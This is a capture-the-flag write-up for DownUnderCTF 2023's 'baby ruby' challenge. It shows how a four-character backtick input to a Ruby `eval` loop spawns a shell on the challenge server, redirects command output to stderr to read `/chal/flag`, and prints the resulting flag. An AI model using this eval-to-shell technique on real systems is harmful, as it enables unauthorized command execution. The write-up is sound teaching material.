# DownUnderCTF 2023

## baby ruby

> How well do you know your Ruby?
> 
> The flag is at `/chal/flag`.
>
>  Author: hashkitten
>
> [`baby.rb`](baby.rb)

Tags: _misc_

## Solution
For this challenge we get a very short `Ruby` code:

```ruby
#!/usr/bin/env ruby

while input = STDIN.gets.chomp do eval input if input.size < 5 end
```

The program takes input and calls `eval` on it if the input length is less than 5. Thats not much we can send, but there is \`cmd\`, that allows us to spawn a shell.

```ruby
$ nc 2023.ductf.dev 30028
`sh`
cat /chal/flag
```

Sadly no output is given. After trying around a bit I noticed that only errors are printed. This probably means that only stderr is displayed. So forwarding our output to stderr gives the flag.

```ruby
$ nc 2023.ductf.dev 30028
`sh`
cat /chal/flag 1>&2
DUCTF{how_to_pwn_ruby_in_four_easy_steps}
```

Flag `DUCTF{how_to_pwn_ruby_in_four_easy_steps}`